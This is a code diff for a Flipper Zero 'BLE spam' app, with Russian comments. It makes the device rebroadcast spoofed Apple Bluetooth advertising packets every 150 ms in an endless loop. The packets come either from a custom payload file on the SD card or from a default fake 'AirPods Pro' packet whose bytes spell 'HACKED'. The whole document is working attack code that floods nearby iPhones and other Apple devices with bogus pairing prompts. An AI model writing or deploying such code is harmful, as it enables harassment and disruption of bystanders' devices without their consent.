@@ -1,12 +1,10 @@
 #include <furi.h>
 #include <furi_hal.h>
+#include <storage/storage.h>
 #include <furi_hal_bt.h>
-#include <gui/gui.h>
-#include <gui/view_dispatcher.h>
-#include <gui/scene_manager.h>
+#include <furi_hal_gpio.h>
 #include "protocols/_registry.h"
 
-#include <storage/storage.h>
 #define CUSTOM_PACKETS_PATH EXT_PATH("apps_data/ble_spam/apple_custom.txt")
 #define MAX_CUSTOM_PAYLOAD_LEN 31
 
@@ -24,8 +22,9 @@ static void load_custom_apple_packet(void) {
     Storage* storage = furi_record_open(RECORD_STORAGE);
     File* file = storage_file_alloc(storage);
     custom_payload_len = 0;
+    
     if(storage_file_open(file, CUSTOM_PACKETS_PATH, FSAM_READ, FSOM_OPEN_EXISTING)) {
-        char buffer[128]; // Корректный массив-буфер для чтения строки
+        char buffer[128]; // Корректный массив-буфер для строки
         uint16_t read = storage_file_read(file, buffer, sizeof(buffer) - 1);
         if(read > 0) {
             buffer[read] = '\0';
@@ -52,42 +51,39 @@ static void load_custom_apple_packet(void) {
     storage_file_free(file);
     furi_record_close(RECORD_STORAGE);
 }
-/* Конец нашего блока */
 
-// Перехватчик отправки пакета BLE в радиоэфир
+// Функция-перехватчик BLE пакетов
 void ble_spam_send_packet(const uint8_t* original_data, uint8_t original_len) {
-    // Наш перехватчик:
     load_custom_apple_packet();
-        if(custom_payload_len > 0) {
-            furi_hal_bt_extra_beacon_set_data(custom_payload, custom_payload_len);
-        } else {
-    // Здесь оставьте оригинальную строчку, которая была в коде изначально, например:
-            furi_hal_bt_extra_beacon_set_data(tx_data, tx_len); 
-        }
 
-// Главная точка входа приложения Flipper Zero (согласно манифесту application.fam)
+    if(custom_payload_len > 0) {
+        // Если файл apple_custom.txt найден и прочитан — принудительно шлем его
+        furi_hal_bt_extra_beacon_set_data(custom_payload, custom_payload_len);
+    } else {
+        // Если файла нет — отправляем оригинальный пакет, переданный в функцию
+        furi_hal_bt_extra_beacon_set_data(original_data, original_len);
+    }
+}
+
+// Главная входная точка приложения для линкера
 int32_t ble_spam_app(void* p) {
     UNUSED(p);
     
-    // Инициализируем Bluetooth маяк
     furi_hal_bt_extra_beacon_stop();
     
-    // Небольшой цикл-заглушка для генерации пакетов. 
-    // Приложение при запуске сразу включит трансляцию пакета
+    // Дефолтный пакет (AirPods Pro) на случай отсутствия файла на SD
     uint8_t default_pack[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x10, 0x42, 0x04, 0x48, 0x41, 0x43, 0x4B, 0x45, 0x44};
     
     while(1) {
-        // Вызываем наш перехватчик вместо прямой отправки
+        // Вызываем наш перехватчик для отправки данных
         ble_spam_send_packet(default_pack, sizeof(default_pack));
         furi_hal_bt_extra_beacon_start();
         
-        // Каждые 150 миллисекунд шлем пакет в эфир
         furi_delay_ms(150);
         
         furi_hal_bt_extra_beacon_stop();
         
-        // Проверяем, не нажал ли пользователь кнопку Назад (Exit)
-        // Чтобы выйти из бесконечного цикла приложения, удерживайте кнопку назад на Флиппере
+        // Проверяем нажатие кнопки Назад для безопасного выхода из цикла
         if(furi_hal_gpio_read(&gpio_button_back) == false) {
             break;
         }
